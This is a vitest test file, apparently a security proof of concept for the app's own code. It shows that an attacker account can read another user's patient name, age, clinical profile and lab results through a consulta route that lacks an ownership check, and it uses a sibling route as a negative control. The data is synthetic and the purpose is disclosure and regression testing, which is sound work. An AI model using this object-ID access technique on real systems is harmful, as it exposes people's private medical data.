import { describe, it, expect, beforeEach } from 'vitest';
import { api, authHeader, resetDb, createUser, createExam, createItem } from './helpers';
import { prisma } from '../src/prisma';

// BOLA PoC 1 — POST /api/consulta/exams/:examId (src/routes/consulta.ts:10-27)
// Handler fetches the exam by bare CUID with ZERO ownership check, then renders
// patient full name, age, clinical profile, lab values and prior-exam comparison.
// Sibling control (negative): GET /api/exams/:id uses loadOwnedExam → 404 for foreign exam.
describe('BOLA: POST /api/consulta/exams/:examId sem ownership check', () => {
  beforeEach(async () => {
    await resetDb();
  });

  it('user B reads user A\'s clinical data via consulta route (200 + PII in HTML)', async () => {
    // Victim: user A with a distinctive patient profile + abnormal lab values.
    const victim = await createUser({ name: 'Maria Silva Vítima' });
    await prisma.patient.update({
      where: { id: victim.patient.id },
      data: {
        dateOfBirth: new Date('1985-04-12T00:00:00Z'),
        clinicalProfile: 'Hipotireoidismo; alérgica a penicilina',
      },
    });
    const examA = await createExam(victim.patient.id, { title: 'Hemograma da Maria' });
    await createItem(examA.id, {
      name: 'TSH', valueNumeric: 8.4, valueText: '8.4', unit: 'mUI/L',
      refLow: 0.4, refHigh: 4.0, flag: 'HIGH', isAbnormal: true,
    });

    // Attacker: user B, unrelated tenant, knows/guesses the exam CUID.
    const attacker = await createUser({ name: 'Atacante B' });

    // NEGATIVE CONTROL — sibling route GET /api/exams/:id (loadOwnedExam) must 404.
    const ctrl = await api()
      .get(`/api/exams/${examA.id}`)
      .set(authHeader(attacker.token));
    expect(ctrl.status).toBe(404);

    // ATTACK — POST /api/consulta/exams/:examId with the same foreign examId.
    const r = await api()
      .post(`/api/consulta/exams/${examA.id}`)
      .set(authHeader(attacker.token));

    expect(r.status).toBe(200);
    const html: string = r.body.html ?? '';
    expect(html).toContain('Maria Silva Vítima');          // victim full name
    const age = Math.floor((Date.now() - new Date('1985-04-12T00:00:00Z').getTime()) / (365.25 * 24 * 3600 * 1000));
    expect(html).toContain(`${age} anos`);                 // victim age from dateOfBirth
    expect(html).toContain('Hipotireoidismo');             // victim clinical profile
    expect(html).toContain('TSH');                         // victim lab analyte
    expect(html).toContain('8.4');                         // victim lab value
    expect(html).toContain('Hemograma da Maria');          // victim exam title
  });
});